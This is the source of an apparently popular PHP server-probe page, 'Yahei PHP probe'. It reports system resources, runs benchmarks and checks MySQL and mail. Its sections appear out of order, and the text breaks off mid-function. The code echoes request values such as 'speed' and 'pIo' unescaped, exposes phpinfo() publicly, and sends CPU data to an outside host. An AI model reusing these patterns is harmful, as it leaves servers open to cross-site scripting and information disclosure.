&lt;input type=&quot;hidden&quot; name=&quot;pIo&quot; value=&quot;&lt;?php echo $valIo;?&gt;&quot; /&gt;

&lt;a name=&quot;w_networkspeed&quot;&gt;&lt;/a&gt;
&lt;!--网络速度测试--&gt;
&lt;table&gt;
	&lt;tr&gt;&lt;th colspan=&quot;3&quot;&gt;网络速度测试&lt;/th&gt;&lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width=&quot;19%&quot; align=&quot;center&quot;&gt;&lt;input name=&quot;act&quot; type=&quot;submit&quot; class=&quot;btn&quot; value=&quot;开始测试&quot; /&gt;
        &lt;br /&gt;
	向客户端传送1000k字节数据&lt;br /&gt;
	带宽比例按理想值计算
	&lt;/td&gt;
    &lt;td width=&quot;81%&quot; align=&quot;center&quot; &gt;

  &lt;table align=&quot;center&quot; width=&quot;550&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; &gt;
    &lt;tr &gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;带宽&lt;/td&gt;
	&lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;1M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;2M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;3M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;4M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;5M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;6M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;7M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;8M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;9M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;10M&lt;/td&gt;
    &lt;/tr&gt;
   &lt;tr&gt;
    &lt;td colspan=&quot;11&quot; class=&quot;suduk&quot; &gt;&lt;table align=&quot;center&quot; width=&quot;550&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; height=&quot;8&quot; class=&quot;suduk&quot;&gt;
    &lt;tr&gt;
      &lt;td class=&quot;sudu&quot;  width=&quot;&lt;?php 
	if(preg_match(&quot;/[^\d-., ]/&quot;,$speed))
		&#123;
			echo &quot;0&quot;;
		&#125;
	else&#123;
			echo 550*($speed/11000);
		&#125; 
		?&gt;&quot;&gt;&lt;/td&gt;
      &lt;td class=&quot;suduk&quot; width=&quot;&lt;?php 
	if(preg_match(&quot;/[^\d-., ]/&quot;,$speed))
		&#123;
			echo &quot;550&quot;;
		&#125;
	else&#123;
			echo 550-550*($speed/11000);
		&#125; 
		?&gt;&quot;&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;/table&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;/table&gt;
  &lt;?php echo (isset($_GET['speed']))?&quot;下载1000KB数据用时 &lt;font color='#cc0000'&gt;&quot;.$_GET['speed'].&quot;&lt;/font&gt; 毫秒，下载速度：&quot;.&quot;&lt;font color='#cc0000'&gt;&quot;.$speed.&quot;&lt;/font&gt;&quot;.&quot; kb/s，需测试多次取平均值，超过10M直接看下载速度&quot;:&quot;&lt;font color='#cc0000'&gt;&amp;nbsp;未探测&amp;nbsp;&lt;/font&gt;&quot; ?&gt;

    &lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;

&lt;a name=&quot;w_MySQL&quot;&gt;&lt;/a&gt;

&lt;!--MySQL数据库连接检测--&gt;

&lt;table&gt;

	&lt;tr&gt;&lt;th colspan=&quot;3&quot;&gt;MySQL数据库连接检测&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;15%&quot;&gt;&lt;/td&gt;

    &lt;td width=&quot;60%&quot;&gt;

      地址：&lt;input type=&quot;text&quot; name=&quot;host&quot; value=&quot;localhost&quot; size=&quot;10&quot; /&gt;

      端口：&lt;input type=&quot;text&quot; name=&quot;port&quot; value=&quot;3306&quot; size=&quot;10&quot; /&gt;

      用户名：&lt;input type=&quot;text&quot; name=&quot;login&quot; size=&quot;10&quot; /&gt;

      密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; size=&quot;10&quot; /&gt;

    &lt;/td&gt;

    &lt;td width=&quot;25%&quot;&gt;

      &lt;input class=&quot;btn&quot; type=&quot;submit&quot; name=&quot;act&quot; value=&quot;MySQL检测&quot; /&gt;

    &lt;/td&gt;

  &lt;/tr&gt;

&lt;/table&gt;

  &lt;?php

  if ($_POST['act'] == 'MySQL检测') &#123;

  	if(function_exists(&quot;mysql_close&quot;)==1) &#123;

  		$link = @mysql_connect($host.&quot;:&quot;.$port,$login,$password);

  		if ($link)&#123;

  			echo &quot;&lt;script&gt;alert('连接到MySql数据库正常')&lt;/script&gt;&quot;;

  		&#125; else &#123;

  			echo &quot;&lt;script&gt;alert('无法连接到MySql数据库！')&lt;/script&gt;&quot;;

  		&#125;

  	&#125; else &#123;

  		echo &quot;&lt;script&gt;alert('服务器不支持MySQL数据库！')&lt;/script&gt;&quot;;

  	&#125;

  &#125;

	?&gt;
	
&lt;a name=&quot;w_function&quot;&gt;&lt;/a&gt;

&lt;!--函数检测--&gt;

&lt;table&gt;

	&lt;tr&gt;&lt;th colspan=&quot;3&quot;&gt;函数检测&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;15%&quot;&gt;&lt;/td&gt;

    &lt;td width=&quot;60%&quot;&gt;

      请输入您要检测的函数：

      &lt;input type=&quot;text&quot; name=&quot;funName&quot; size=&quot;50&quot; /&gt;

    &lt;/td&gt;

    &lt;td width=&quot;25%&quot;&gt;

      &lt;input class=&quot;btn&quot; type=&quot;submit&quot; name=&quot;act&quot; align=&quot;right&quot; value=&quot;函数检测&quot; /&gt;

    &lt;/td&gt;

  &lt;/tr&gt;

  &lt;?php

  if ($_POST['act'] == '函数检测') &#123;

  	echo &quot;&lt;script&gt;alert('$funRe')&lt;/script&gt;&quot;;

  &#125;

  ?&gt;

&lt;/table&gt;

&lt;a name=&quot;w_mail&quot;&gt;&lt;/a&gt;

&lt;!--邮件发送检测--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan=&quot;3&quot;&gt;邮件发送检测&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;15%&quot;&gt;&lt;/td&gt;

    &lt;td width=&quot;60%&quot;&gt;

      请输入您要检测的邮件地址：

      &lt;input type=&quot;text&quot; name=&quot;mailAdd&quot; size=&quot;50&quot; /&gt;

    &lt;/td&gt;

    &lt;td width=&quot;25%&quot;&gt;

    &lt;input class=&quot;btn&quot; type=&quot;submit&quot; name=&quot;act&quot; value=&quot;邮件检测&quot; /&gt;

    &lt;/td&gt;

  &lt;/tr&gt;

  &lt;?php

  if ($_POST['act'] == '邮件检测') &#123;

  	echo &quot;&lt;script&gt;alert('$mailRe')&lt;/script&gt;&quot;;

  &#125;

  ?&gt;

&lt;/table&gt;

&lt;/form&gt;



	&lt;table&gt;
		&lt;tr&gt;
			&lt;td class=&quot;w_foot&quot;&gt;&lt;A HREF=&quot;http://www.Yahei.Net&quot; target=&quot;_blank&quot;&gt;&lt;?php echo $title.$version;?&gt;&lt;/A&gt;&lt;/td&gt;
			&lt;td class=&quot;w_foot&quot;&gt;&lt;?php $run_time = sprintf('%0.4f', microtime_float() - $time_start);?&gt;Processed in &lt;?php echo $run_time?&gt; seconds. &lt;?php echo memory_usage();?&gt; memory usage.&lt;/td&gt;
			&lt;td class=&quot;w_foot&quot;&gt;&lt;a href=&quot;#w_top&quot;&gt;返回顶部&lt;/a&gt;&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/table&gt;

&lt;/div&gt;

&lt;/body&gt;

&lt;/html&gt;
&lt;?php
/* ---------------------------------------------------- */
/* 程序名称: PHP探针-Yahei
/* 程序功能: 探测系统的Web服务器运行环境
/* 程序开发: Yahei.Net
/* 联系方式: info@Yahei.net
/* Date: 1970-01-01 / 2012-07-08
/* ---------------------------------------------------- */
/* 使用条款:
/* 1.该软件免费使用.
/* 2.禁止任何衍生版本.
/* ---------------------------------------------------- */
/* 感谢以下朋友为探针做出的贡献:
/* zyypp,酷を龙卷风,龙智超,菊花肿了,闲人,Clare Lou,hotsnow
/* 二戒,yexinzhu,wangyu1314,Kokgog,gibyasus,黃子珅,A大,huli
/* 小松,charwin,华景网络
/* 您可能是下一个?
/* ---------------------------------------------------- */
error_reporting(0); //抑制所有错误信息
@header(&quot;content-Type: text/html; charset=utf-8&quot;); //语言强制
ob_start();
date_default_timezone_set('Asia/Shanghai');//此句用于消除时间差

$title = '雅黑PHP探针[简体版]';

$version = &quot;v0.4.7&quot;; //版本号



define('HTTP_HOST', preg_replace('~^www\.~i', '', $_SERVER['HTTP_HOST']));



$time_start = microtime_float();



function memory_usage() 
&#123;

	$memory	 = ( ! function_exists('memory_get_usage')) ? '0' : round(memory_get_usage()/1024/1024, 2).'MB';

	return $memory;

&#125;


// 计时

function microtime_float() 
&#123;

	$mtime = microtime();

	$mtime = explode(' ', $mtime);

	return $mtime[1] + $mtime[0];

&#125;


//单位转换
function formatsize($size) 
&#123;
	$danwei=array(' B ',' K ',' M ',' G ',' T ');
	$allsize=array();
	$i=0;

	for($i = 0; $i &lt;5; $i++) 
	&#123;
		if(floor($size/pow(1024,$i))==0)&#123;break;&#125;
	&#125;

	for($l = $i-1; $l &gt;=0; $l--) 
	&#123;
		$allsize1[$l]=floor($size/pow(1024,$l));
		$allsize[$l]=$allsize1[$l]-$allsize1[$l+1]*1024;
	&#125;

	$len=count($allsize);

	for($j = $len-1; $j &gt;=0; $j--) 
	&#123;
		$fsize=$fsize.$allsize[$j].$danwei[$j];
	&#125;	
	return $fsize;
&#125;


function valid_email($str) 
&#123;

	return ( ! preg_match(&quot;/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]&#123;2,6&#125;$/ix&quot;, $str)) ? FALSE : TRUE;

&#125;


//检测PHP设置参数

function show($varName)
&#123;

	switch($result = get_cfg_var($varName))
	&#123;

		case 0:

			return '&lt;font color=&quot;red&quot;&gt;×&lt;/font&gt;';

		break;
		

		case 1:

			return '&lt;font color=&quot;green&quot;&gt;√&lt;/font&gt;';

		break;
		

		default:

			return $result;

		break;

	&#125;

&#125;



//保留服务器性能测试结果

$valInt = isset($_POST['pInt']) ? $_POST['pInt'] : &quot;未测试&quot;;

$valFloat = isset($_POST['pFloat']) ? $_POST['pFloat'] : &quot;未测试&quot;;

$valIo = isset($_POST['pIo']) ? $_POST['pIo'] : &quot;未测试&quot;;



if ($_GET['act'] == &quot;phpinfo&quot;) 
&#123;

	phpinfo();

	exit();

&#125; 
elseif($_POST['act'] == &quot;整型测试&quot;)
&#123;

	$valInt = test_int();

&#125; 
elseif($_POST['act'] == &quot;浮点测试&quot;)
&#123;

	$valFloat = test_float();

&#125; 
elseif($_POST['act'] == &quot;IO测试&quot;)
&#123;

	$valIo = test_io();

&#125; 
//网速测试-开始
elseif($_POST['act']==&quot;开始测试&quot;)
&#123;
?&gt;
	&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;
		var acd1;
		acd1 = new Date();
		acd1ok=acd1.getTime();
	&lt;/script&gt;
	&lt;?php
	for($i=1;$i&lt;=100000;$i++)
	&#123;
		echo &quot;&lt;!--567890#########0#########0#########0#########0#########0#########0#########0#########012345--&gt;&quot;;
	&#125;
	?&gt;
	&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;
		var acd2;
		acd2 = new Date();
		acd2ok=acd2.getTime();
		window.location = '?speed=' +(acd2ok-acd1ok)+'#w_networkspeed';
	&lt;/script&gt;
&lt;?php
&#125;
//网速测试-结束
elseif($_GET['act'] == &quot;Function&quot;)
&#123;
	$arr = get_defined_functions();
	Function php()
	&#123;
	&#125;
	echo &quot;&lt;pre&gt;&quot;;
	Echo &quot;这里显示系统所支持的所有函数,和自定义函数\n&quot;;
	print_r($arr);
	echo &quot;&lt;/pre&gt;&quot;;
	exit();
&#125;elseif($_GET['act'] == &quot;disable_functions&quot;)
&#123;
	$disFuns=get_cfg_var(&quot;disable_functions&quot;);
	if(empty($disFuns))
	&#123;
		$arr = '&lt;font color=red&gt;×&lt;/font&gt;';
	&#125;
	else
	&#123; 
		$arr = $disFuns;
	&#125;
	Function php()
	&#123;
	&#125;
	echo &quot;&lt;pre&gt;&quot;;
	Echo &quot;这里显示系统被禁用的函数\n&quot;;
	print_r($arr);
	echo &quot;&lt;/pre&gt;&quot;;
	exit();
&#125;



//MySQL检测

if ($_POST['act'] == 'MySQL检测')
&#123;

	$host = isset($_POST['host']) ? trim($_POST['host']) : '';

	$port = isset($_POST['port']) ? (int) $_POST['port'] : '';

	$login = isset($_POST['login']) ? trim($_POST['login']) : '';

	$password = isset($_POST['password']) ? trim($_POST['password']) : '';

	$host = preg_match('~[^a-z0-9\-\.]+~i', $host) ? '' : $host;

	$port = intval($port) ? intval($port) : '';

	$login = preg_match('~[^a-z0-9\_\-]+~i', $login) ? '' : htmlspecialchars($login);

	$password = is_string($password) ? htmlspecialchars($password) : '';

&#125;
elseif ($_POST['act'] == '函数检测')
&#123;

	$funRe = &quot;函数&quot;.$_POST['funName'].&quot;支持状况检测结果：&quot;.isfun1($_POST['funName']);

&#125; 
elseif ($_POST['act'] == '邮件检测')
&#123;

	$mailRe = &quot;邮件发送检测结果：发送&quot;;
	if($_SERVER['SERVER_PORT']==80)&#123;$mailContent = &quot;http://&quot;.$_SERVER['SERVER_NAME'].($_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']);&#125;
	else&#123;$mailContent = &quot;http://&quot;.$_SERVER['SERVER_NAME'].&quot;:&quot;.$_SERVER['SERVER_PORT'].($_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']);&#125;
	$mailRe .= (false !== @mail($_POST[&quot;mailAdd&quot;], $mailContent, &quot;This is a test mail!&quot;)) ? &quot;完成&quot;:&quot;失败&quot;;

&#125;


//网络速度测试
if(isset($_POST['speed']))
&#123;
	$speed=round(100/($_POST['speed']/1000),2);
&#125;
elseif($_GET['speed']==&quot;0&quot;)
&#123;
	$speed=6666.67;
&#125;
elseif(isset($_GET['speed']) and $_GET['speed']&gt;0)
&#123;
	$speed=round(100/($_GET['speed']/1000),2); //下载速度：$speed kb/s
&#125;
else
&#123;
	$speed=&quot;&lt;font color=\&quot;red\&quot;&gt;&amp;nbsp;未探测&amp;nbsp;&lt;/font&gt;&quot;;
&#125;	
	
	

// 检测函数支持

function isfun($funName = '')
&#123;

    if (!$funName || trim($funName) == '' || preg_match('~[^a-z0-9\_]+~i', $funName, $tmp)) return '错误';

	return (false !== function_exists($funName)) ? '&lt;font color=&quot;green&quot;&gt;√&lt;/font&gt;' : '&lt;font color=&quot;red&quot;&gt;×&lt;/font&gt;';
&#125;
function isfun1($funName = '')
&#123;
    if (!$funName || trim($funName) == '' || preg_match('~[^a-z0-9\_]+~i', $funName, $tmp)) return '错误';
	return (false !== function_exists($funName)) ? '√' : '×';
&#125;



//整数运算能力测试

function test_int()
&#123;

	$timeStart = gettimeofday();

	for($i = 0; $i &lt; 3000000; $i++)
	&#123;

		$t = 1+1;

	&#125;

	$timeEnd = gettimeofday();

	$time = ($timeEnd[&quot;usec&quot;]-$timeStart[&quot;usec&quot;])/1000000+$timeEnd[&quot;sec&quot;]-$timeStart[&quot;sec&quot;];

	$time = round($time, 3).&quot;秒&quot;;

	return $time;

&#125;



//浮点运算能力测试

function test_float()
&#123;

	//得到圆周率值

	$t = pi();

	$timeStart = gettimeofday();



	for($i = 0; $i &lt; 3000000; $i++)
	&#123;

		//开平方

		sqrt($t);

	&#125;



	$timeEnd = gettimeofday();

	$time = ($timeEnd[&quot;usec&quot;]-$timeStart[&quot;usec&quot;])/1000000+$timeEnd[&quot;sec&quot;]-$timeStart[&quot;sec&quot;];

	$time = round($time, 3).&quot;秒&quot;;

	return $time;

&#125;



//IO能力测试

function test_io()
&#123;

	$fp = @fopen(PHPSELF, &quot;r&quot;);

	$timeStart = gettimeofday();

	for($i = 0; $i &lt; 10000; $i++) 
	&#123;

		@fread($fp, 10240);

		@rewind($fp);

	&#125;

	$timeEnd = gettimeofday();

	@fclose($fp);

	$time = ($timeEnd[&quot;usec&quot;]-$timeStart[&quot;usec&quot;])/1000000+$timeEnd[&quot;sec&quot;]-$timeStart[&quot;sec&quot;];

	$time = round($time, 3).&quot;秒&quot;;

	return($time);

&#125;

function GetCoreInformation() &#123;$data = file('/proc/stat');$cores = array();foreach( $data as $line ) &#123;if( preg_match('/^cpu[0-9]/', $line) )&#123;$info = explode(' ', $line);$cores[]=array('user'=&gt;$info[1],'nice'=&gt;$info[2],'sys' =&gt; $info[3],'idle'=&gt;$info[4],'iowait'=&gt;$info[5],'irq' =&gt; $info[6],'softirq' =&gt; $info[7]);&#125;&#125;return $cores;&#125;
function GetCpuPercentages($stat1, $stat2) &#123;if(count($stat1)!==count($stat2))&#123;return;&#125;$cpus=array();for( $i = 0, $l = count($stat1); $i &lt; $l; $i++) &#123;	$dif = array();	$dif['user'] = $stat2[$i]['user'] - $stat1[$i]['user'];$dif['nice'] = $stat2[$i]['nice'] - $stat1[$i]['nice'];	$dif['sys'] = $stat2[$i]['sys'] - $stat1[$i]['sys'];$dif['idle'] = $stat2[$i]['idle'] - $stat1[$i]['idle'];$dif['iowait'] = $stat2[$i]['iowait'] - $stat1[$i]['iowait'];$dif['irq'] = $stat2[$i]['irq'] - $stat1[$i]['irq'];$dif['softirq'] = $stat2[$i]['softirq'] - $stat1[$i]['softirq'];$total = array_sum($dif);$cpu = array();foreach($dif as $x=&gt;$y) $cpu[$x] = round($y / $total * 100, 2);$cpus['cpu' . $i] = $cpu;&#125;return $cpus;&#125;
$stat1 = GetCoreInformation();sleep(1);$stat2 = GetCoreInformation();$data = GetCpuPercentages($stat1, $stat2);
$cpu_show = $data['cpu0']['user'].&quot;%us,  &quot;.$data['cpu0']['sys'].&quot;%sy,  &quot;.$data['cpu0']['nice'].&quot;%ni, &quot;.$data['cpu0']['idle'].&quot;%id,  &quot;.$data['cpu0']['iowait'].&quot;%wa,  &quot;.$data['cpu0']['irq'].&quot;%irq,  &quot;.$data['cpu0']['softirq'].&quot;%softirq&quot;;
function makeImageUrl($title, $data) &#123;$api='http://api.yahei.net/tz/cpu_show.php?id=';$url.=$data['user'].',';$url.=$data['nice'].',';$url.=$data['sys'].',';$url.=$data['idle'].',';$url.=$data['iowait'];$url.='&amp;chdl=User|Nice|Sys|Idle|Iowait&amp;chdlp=b&amp;chl=';$url.=$data['user'].'%25|';$url.=$data['nice'].'%25|';$url.=$data['sys'].'%25|';$url.=$data['idle'].'%25|';$url.=$data['iowait'].'%25';$url.='&amp;chtt=Core+'.$title;return $api.base64_encode($url);&#125;
if($_GET['act'] == &quot;cpu_percentage&quot;)&#123;echo &quot;&lt;center&gt;&lt;b&gt;&lt;font face='Microsoft YaHei' color='#666666' size='3'&gt;图片加载慢，请耐心等待！&lt;/font&gt;&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&quot;;foreach( $data as $k =&gt; $v ) &#123;echo '&lt;img src=&quot;' . makeImageUrl( $k, $v ) . '&quot; style=&quot;width:360px;height:240px;border: #CCCCCC 1px solid;background: #FFFFFF;margin:5px;padding:5px;&quot; /&gt;';&#125;echo &quot;&lt;/center&gt;&quot;;exit();&#125;



// 根据不同系统取得CPU相关信息

switch(PHP_OS)
&#123;

	case &quot;Linux&quot;:

		$sysReShow = (false !== ($sysInfo = sys_linux()))?&quot;show&quot;:&quot;none&quot;;

	break;
	

	case &quot;FreeBSD&quot;:

		$sysReShow = (false !== ($sysInfo = sys_freebsd()))?&quot;show&quot;:&quot;none&quot;;

	break;
/*	

	case &quot;WINNT&quot;:

		$sysReShow = (false !== ($sysInfo = sys_windows()))?&quot;show&quot;:&quot;none&quot;;

	break;
*/	

	default:

	break;

&#125;



//linux系统探测

function sys_linux()

&#123;

    // CPU

    if (false === ($str = @file(&quot;/proc/cpuinfo&quot;))) return false;

    $str = implode(&quot;&quot;, $str);

    @preg_match_all(&quot;/model\s+name\s&#123;0,&#125;\:+\s&#123;0,&#125;([\w\s\)\(\@.-]+)([\r\n]+)/s&quot;, $str, $model);

    @preg_match_all(&quot;/cpu\s+MHz\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)[\r\n]+/&quot;, $str, $mhz);

    @preg_match_all(&quot;/cache\s+size\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+\s&#123;0,&#125;[A-Z]+[\r\n]+)/&quot;, $str, $cache);

    @preg_match_all(&quot;/bogomips\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)[\r\n]+/&quot;, $str, $bogomips);

    if (false !== is_array($model[1]))

	&#123;

        $res['cpu']['num'] = sizeof($model[1]);
		/*

        for($i = 0; $i &lt; $res['cpu']['num']; $i++)

        &#123;

            $res['cpu']['model'][] = $model[1][$i].'&amp;nbsp;('.$mhz[1][$i].')';

            $res['cpu']['mhz'][] = $mhz[1][$i];

            $res['cpu']['cache'][] = $cache[1][$i];

            $res['cpu']['bogomips'][] = $bogomips[1][$i];

        &#125;*/
		if($res['cpu']['num']==1)
			$x1 = '';
		else
			$x1 = ' ×'.$res['cpu']['num'];
		$mhz[1][0] = ' | 频率:'.$mhz[1][0];
		$cache[1][0] = ' | 二级缓存:'.$cache[1][0];
		$bogomips[1][0] = ' | Bogomips:'.$bogomips[1][0];
		$res['cpu']['model'][] = $model[1][0].$mhz[1][0].$cache[1][0].$bogomips[1][0].$x1;

        if (false !== is_array($res['cpu']['model'])) $res['cpu']['model'] = implode(&quot;&lt;br /&gt;&quot;, $res['cpu']['model']);

        if (false !== is_array($res['cpu']['mhz'])) $res['cpu']['mhz'] = implode(&quot;&lt;br /&gt;&quot;, $res['cpu']['mhz']);

        if (false !== is_array($res['cpu']['cache'])) $res['cpu']['cache'] = implode(&quot;&lt;br /&gt;&quot;, $res['cpu']['cache']);

        if (false !== is_array($res['cpu']['bogomips'])) $res['cpu']['bogomips'] = implode(&quot;&lt;br /&gt;&quot;, $res['cpu']['bogomips']);

	&#125;


    // NETWORK


    // UPTIME

    if (false === ($str = @file(&quot;/proc/uptime&quot;))) return false;

    $str = explode(&quot; &quot;, implode(&quot;&quot;, $str));

    $str = trim($str[0]);

    $min = $str / 60;

    $hours = $min / 60;

    $days = floor($hours / 24);

    $hours = floor($hours - ($days * 24));

    $min = floor($min - ($days * 60 * 24) - ($hours * 60));

    if ($days !== 0) $res['uptime'] = $days.&quot;天&quot;;

    if ($hours !== 0) $res['uptime'] .= $hours.&quot;小时&quot;;

    $res['uptime'] .= $min.&quot;分钟&quot;;


    // MEMORY

    if (false === ($str = @file(&quot;/proc/meminfo&quot;))) return false;

    $str = implode(&quot;&quot;, $str);

    preg_match_all(&quot;/MemTotal\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?MemFree\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?Cached\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?SwapTotal\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?SwapFree\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)/s&quot;, $str, $buf);
	preg_match_all(&quot;/Buffers\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)/s&quot;, $str, $buffers);


    $res['memTotal'] = round($buf[1][0]/1024, 2);

    $res['memFree'] = round($buf[2][0]/1024, 2);

    $res['memBuffers'] = round($buffers[1][0]/1024, 2);
	$res['memCached'] = round($buf[3][0]/1024, 2);

    $res['memUsed'] = $res['memTotal']-$res['memFree'];

    $res['memPercent'] = (floatval($res['memTotal'])!=0)?round($res['memUsed']/$res['memTotal']*100,2):0;


    $res['memRealUsed'] = $res['memTotal'] - $res['memFree'] - $res['memCached'] - $res['memBuffers']; //真实内存使用
	$res['memRealFree'] = $res['memTotal'] - $res['memRealUsed']; //真实空闲
    $res['memRealPercent'] = (floatval($res['memTotal'])!=0)?round($res['memRealUsed']/$res['memTotal']*100,2):0; //真实内存使用率

	$res['memCachedPercent'] = (floatval($res['memCached'])!=0)?round($res['memCached']/$res['memTotal']*100,2):0; //Cached内存使用率

    $res['swapTotal'] = round($buf[4][0]/1024, 2);

    $res['swapFree'] = round($buf[5][0]/1024, 2);

    $res['swapUsed'] = round($res['swapTotal']-$res['swapFree'], 2);

    $res['swapPercent'] = (floatval($res['swapTotal'])!=0)?round($res['swapUsed']/$res['swapTotal']*100,2):0;


    // LOAD AVG

    if (false === ($str = @file(&quot;/proc/loadavg&quot;))) return false;

    $str = explode(&quot; &quot;, implode(&quot;&quot;, $str));

    $str = array_chunk($str, 4);

    $res['loadAvg'] = implode(&quot; &quot;, $str[0]);


    return $res;

&#125;



//FreeBSD系统探测

function sys_freebsd()
&#123;

	//CPU

	if (false === ($res['cpu']['num'] = get_key(&quot;hw.ncpu&quot;))) return false;

	$res['cpu']['model'] = get_key(&quot;hw.model&quot;);

	//LOAD AVG

	if (false === ($res['loadAvg'] = get_key(&quot;vm.loadavg&quot;))) return false;

	//UPTIME

	if (false === ($buf = get_key(&quot;kern.boottime&quot;))) return false;

	$buf = explode(' ', $buf);

	$sys_ticks = time() - intval($buf[3]);

	$min = $sys_ticks / 60;

	$hours = $min / 60;

	$days = floor($hours / 24);

	$hours = floor($hours - ($days * 24));

	$min = floor($min - ($days * 60 * 24) - ($hours * 60));

	if ($days !== 0) $res['uptime'] = $days.&quot;天&quot;;

	if ($hours !== 0) $res['uptime'] .= $hours.&quot;小时&quot;;

	$res['uptime'] .= $min.&quot;分钟&quot;;

	//MEMORY

	if (false === ($buf = get_key(&quot;hw.physmem&quot;))) return false;

	$res['memTotal'] = round($buf/1024/1024, 2);


	$str = get_key(&quot;vm.vmtotal&quot;);

	preg_match_all(&quot;/\nVirtual Memory[\:\s]*\(Total[\:\s]*([\d]+)K[\,\s]*Active[\:\s]*([\d]+)K\)\n/i&quot;, $str, $buff, PREG_SET_ORDER);

	preg_match_all(&quot;/\nReal Memory[\:\s]*\(Total[\:\s]*([\d]+)K[\,\s]*Active[\:\s]*([\d]+)K\)\n/i&quot;, $str, $buf, PREG_SET_ORDER);


	$res['memRealUsed'] = round($buf[0][2]/1024, 2);

	$res['memCached'] = round($buff[0][2]/1024, 2);

	$res['memUsed'] = round($buf[0][1]/1024, 2) + $res['memCached'];

	$res['memFree'] = $res['memTotal'] - $res['memUsed'];

	$res['memPercent'] = (floatval($res['memTotal'])!=0)?round($res['memUsed']/$res['memTotal']*100,2):0;


	$res['memRealPercent'] = (floatval($res['memTotal'])!=0)?round($res['memRealUsed']/$res['memTotal']*100,2):0;


	return $res;

&#125;



//取得参数值 FreeBSD

function get_key($keyName)
&#123;

	return do_command('sysctl', &quot;-n $keyName&quot;);

&#125;



//确定执行文件位置 FreeBSD

function find_command($commandName)
&#123;

	$path = array('/bin', '/sbin', '/usr/bin', '/usr/sbin', '/usr/local/bin', '/usr/local/sbin');

	foreach($path as $p) 
	&#123;

		if (@is_executable(&quot;$p/$commandName&quot;)) return &quot;$p/$commandName&quot;;

	&#125;

	return false;

&#125;



//执行系统命令 FreeBSD

function do_command($commandName, $args)
&#123;

	$buffer = &quot;&quot;;

	if (false === ($command = find_command($commandName))) return false;

	if ($fp = @popen(&quot;$command $args&quot;, 'r')) 
	&#123;

		while (!@feof($fp))
		&#123;

			$buffer .= @fgets($fp, 4096);

		&#125;

		return trim($buffer);

	&#125;

	return false;

&#125;



//windows系统探测

function sys_windows()
&#123;

	if (PHP_VERSION &gt;= 5)
	&#123;

		$objLocator = new COM(&quot;WbemScripting.SWbemLocator&quot;);

		$wmi = $objLocator-&gt;ConnectServer();

		$prop = $wmi-&gt;get(&quot;Win32_PnPEntity&quot;);

	&#125;
	else
	&#123;
		return false;

	&#125;



	//CPU

	$cpuinfo = GetWMI($wmi,&quot;Win32_Processor&quot;, array(&quot;Name&quot;,&quot;L2CacheSize&quot;,&quot;NumberOfCores&quot;));

	$res['cpu']['num'] = $cpuinfo[0]['NumberOfCores'];

	if (null == $res['cpu']['num']) 
	&#123;

		$res['cpu']['num'] = 1;

	&#125;/*

	for ($i=0;$i&lt;$res['cpu']['num'];$i++)
	&#123;

		$res['cpu']['model'] .= $cpuinfo[0]['Name'].&quot;&lt;br /&gt;&quot;;

		$res['cpu']['cache'] .= $cpuinfo[0]['L2CacheSize'].&quot;&lt;br /&gt;&quot;;

	&#125;*/
	$cpuinfo[0]['L2CacheSize'] = ' ('.$cpuinfo[0]['L2CacheSize'].')';
	if($res['cpu']['num']==1)
		$x1 = '';
	else
		$x1 = ' ×'.$res['cpu']['num'];
	$res['cpu']['model'] = $cpuinfo[0]['Name'].$cpuinfo[0]['L2CacheSize'].$x1;

	// SYSINFO

	$sysinfo = GetWMI($wmi,&quot;Win32_OperatingSystem&quot;, array('LastBootUpTime','TotalVisibleMemorySize','FreePhysicalMemory','Caption','CSDVersion','SerialNumber','InstallDate'));

	$sysinfo[0]['Caption']=iconv('GBK', 'UTF-8',$sysinfo[0]['Caption']);

	$sysinfo[0]['CSDVersion']=iconv('GBK', 'UTF-8',$sysinfo[0]['CSDVersion']);

